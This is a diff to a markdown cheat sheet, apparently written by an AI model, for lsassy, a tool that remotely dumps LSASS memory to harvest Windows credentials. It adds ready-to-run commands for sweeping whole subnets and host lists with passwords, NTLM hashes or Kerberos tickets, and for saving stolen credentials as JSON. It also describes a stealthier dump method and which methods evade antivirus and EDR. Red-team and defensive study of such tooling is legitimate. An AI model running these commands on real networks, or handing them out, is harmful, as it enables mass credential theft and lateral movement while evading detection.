@@ -28,10 +28,19 @@ lsassy -d DOMAIN -u Administrator -H :NTLMhash 192.168.1.10
 # Kerberos (ccache)
 KRB5CCNAME=admin.ccache lsassy -k dc01.domain.local
 
-# Multiple targets (positional, space-separated — there is no -f targets-file flag; -f is --format)
+# Multiple targets — the positional target is nargs="*" and natively accepts
+# IPs, ranges, CIDRs, hostnames, FQDNs, AND a file of targets (one per line).
+# (There is no -f targets-file flag — -f is --format — you just pass the file
+#  positionally. You do NOT need NetExec for a host list or subnet sweep.)
 lsassy -d DOMAIN -u Administrator -p Password 192.168.1.10 192.168.1.20 192.168.1.30
+lsassy -d DOMAIN -u Administrator -p Password 192.168.1.0/24
+lsassy -d DOMAIN -u Administrator -p Password ./hosts.txt
 
-# For a host LIST / subnet sweep, drive it through the NetExec module instead
+# Concurrency across a sweep is capped with -t/--threads (default 256)
+lsassy -d DOMAIN -u Administrator -p Password 192.168.1.0/24 -t 16
+
+# The -M lsassy NetExec module is only worth it when you're ALREADY running
+# NetExec for other tasks — not because lsassy can't sweep on its own.
 netexec smb hosts.txt -u Administrator -p Password -M lsassy
 ```
 
@@ -55,6 +64,7 @@ lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m dumpert
 | Method | Notes |
 |---|---|
 | `comsvcs` | Default — uses `comsvcs.dll MiniDump` LOLBin |
+| `comsvcs_stealth` | comsvcs variant that dumps a partial/obfuscated image — lower detection than plain `comsvcs`, still no binary upload |
 | `procdump` | Sysinternals ProcDump — uploads binary, detected by most AV |
 | `nanodump` | Stealthy LSASS dumper — partial dump, lower AV detection |
 | `dumpert` | Direct syscall dumper — bypasses some EDR hooks |
@@ -79,6 +89,11 @@ lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f json -o /tmp/creds.json
 # Grep-friendly / table to console
 lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep
 lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f table
+
+# Console format and FILE format are independent: -ff/--file-format sets the
+# on-disk format separately from -f (defaults to whatever -f is). e.g. read a
+# clean table on screen while writing machine-parseable JSON to disk:
+lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f table -ff json -o /tmp/creds.json
 ```
 
 ---
@@ -156,5 +171,5 @@ lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep | \
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
-*Model: claude-opus-5*
+*Updated: 2026-09-29*
+*Model: claude-opus-4-8*
